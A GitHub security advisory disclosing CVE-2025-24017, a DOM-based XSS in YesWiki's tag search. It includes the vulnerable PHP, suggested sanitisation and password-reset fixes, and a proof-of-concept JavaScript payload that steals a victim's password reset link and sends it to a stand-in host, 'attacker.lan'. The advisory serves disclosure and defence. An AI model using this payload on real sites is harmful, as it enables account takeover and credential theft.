# [H] Unauthenticated DOM Based XSS in YesWiki

## Summary
Severity: High
Advisory: GHSA-wphc-5f2j-jhvg
CVE: CVE-2025-24017
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:L (CVSS_V3)
Published: 2025-01-21
Source: https://github.com/advisories/GHSA-wphc-5f2j-jhvg
Type: github-advisory

## Affected
- Packagist: `yeswiki/yeswiki` — affected >=0 <4.5.0

## Details
# Unauthenticated DOM Based XSS in YesWiki <= 4.4.5

### Summary
It is possible for any end-user to craft a DOM based XSS on all of YesWiki's pages which will be triggered when a user clicks on a malicious link.

This Proof of Concept has been performed using the followings:
- YesWiki v4.4.5 (`doryphore-dev` branch, latest)
- Docker environnment (`docker/docker-compose.yml`)
- Docker v27.5.0
- Default installation

### Details
The vulnerability makes use of the search by tag feature. When a tag doesn't exist, the tag is reflected on the page and isn't properly sanitized on the server side which allows a malicious user to generate a link that will trigger an XSS on the client's side when clicked. 

This part of the code is managed by `tools/tags/handlers/page/listpages.php`, and **[this piece of code](https://github.com/YesWiki/yeswiki/blob/doryphore-dev/tools/tags/handlers/page/listpages.php#L84)** is responsible for the vulnerability:

```php
$output .= '<div class="alert alert-info">' . "\n";
if ($nb_total > 1) {
    $output .= _t('TAGS_TOTAL_NB_PAGES', ['nb_total' => $nb_total]);
} elseif ($nb_total == 1) {
    $output .= _t('TAGS_ONE_PAGE_FOUND');
} else {
    $output .= _t('TAGS_NO_PAGE');
}
$output .= (!empty($tab_selected_tags) ? ' ' . _t('TAGS_WITH_KEYWORD') . ' ' . implode(' ' . _t('TAGS_WITH_KEYWORD_SEPARATOR') . ' ', array_map(function ($tagName) {
    return '<span class="tag-label label label-info">' . $tagName . '</span>';
}, $tab_selected_tags)) : '') . '.';
$output .= $this->Format('{{rss tags="' . $tags . '" class="pull-right"}}') . "\n";
$output .= '</div>' . "\n" . $text;

echo $this->Header();
echo "<div class=\"page\">\n$output\n$outputselecttag\n<hr class=\"hr_clear\" />\n</div>\n";
echo $this->Footer();
```

The tag names aren't properly sanitized when adding them to the page's response, thus when a tag name is user controlled, it allows client side code execution. This case describes a case where the tag name doesn't exist, but if an admin creates a malicious tag, it will also end up in XSS when rendered.

### PoC
#### 1. Simple XSS
Abusing the `tags` parameter, we can successfully obtain client side javascript execution:

![poc1](https://github.com/user-attachments/assets/cfd59dd6-ebda-4587-b903-d2777fc7d780)

#### 2. Full account takeover scenario
By changing the payload of the XSS it was possible to establish a full acount takeover through a weak password recovery mechanism abuse ([CWE-460](https://cwe.mitre.org/data/definitions/640.html)). The following exploitation script allows an attacker to extract the password reset link of every logged in user that is triggered by the XSS:

```javascript
fetch('/?ParametresUtilisateur')
  .then(response => {
    return response.text();
  })
  .then(htmlString => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(htmlString, 'text/html');
    const resetLinkElement = doc.querySelector('.control-group .controls a'); //dirty
    fetch('http://attacker.lan:4444/?xss='.concat(btoa(resetLinkElement.href)));
  })
```

Hosting this script on a listener, when an admin is tricked into clicking on a maliciously crafted link, we can then reset its password and takeover their account.

![poc2](https://github.com/user-attachments/assets/02884697-f0a5-43df-8bab-d83f8c9a102d)
![poc3](https://github.com/user-attachments/assets/ef5b44f1-97bb-4cf1-a32b-471f8c672ebd)
![poc4](https://github.com/user-attachments/assets/6a0193a2-1a01-4c65-bd97-f7c900f7f174)

### Impact
This vulnerability allows any user to generate a malicious link that will trigger an account takeover when clicked, therefore allowing a user to steal other accounts, modify pages, comments, permissions, extract user data (emails), thus impacting the integrity, availabilty and confidentiality of a YesWiki instance.

### Suggestion of possible corrective measures
- Sanitize properly the tag names when created [here](https://github.com/YesWiki/yeswiki/blob/doryphore-dev/tools/tags/services/TagsManager.php#L60)

```php
        foreach ($tags as $tag) {
            trim($tag);
            if ($tag != '') {
                if (!$this->tripleStore->exist($page, 'http://outils-reseaux.org/_vocabulary/tag', htmlspecialchars($tag), '', '')) {
                    $this->tripleStore->create($page, 'http://outils-reseaux.org/_vocabulary/tag', htmlspecialchars($tag), '', '');
                }
                //on supprime ce tag du tableau des tags restants a effacer
                if (isset($tags_restants_a_effacer)) {
                    unset($tags_restants_a_effacer[array_search($tag, $tags_restants_a_effacer)]);
                }
            }
        }
```

- Sanitize the tag names when looked for [here](https://github.com/YesWiki/yeswiki/blob/doryphore-dev/tools/tags/handlers/page/listpages.php#L15)

```php
//$tags = (isset($_GET['tags'])) ? $_GET['tags'] : '';
$tags = (isset($_GET['tags'])) ? htmlspecialchars($_GET['tags']) : '';
```

- Implement a stronger password reset mechanism through:
  + Not showing a password reset link to an already logged-in user. 
  + Generating a password reset link when a reset is requested by a user, and only send it by mail.
  + Add an expiration/due date to the token

- Implement a strong Content Security Policy to mitigate other XSS sinks (preferably using a random nonce)
> The latter idea is expensive to develop/implement, but given the number of likely sinks allowing Cross Site Scripting in the YesWiki source code, it seems necessary and easier than seeking for any improperly sanitized user input.

## References
- https://github.com/YesWiki/yeswiki/security/advisories/GHSA-wphc-5f2j-jhvg
- https://nvd.nist.gov/vuln/detail/CVE-2025-24017
- https://github.com/YesWiki/yeswiki/commit/c1e28b59394957902c31c850219e4504a20db98b
- https://github.com/YesWiki/yeswiki
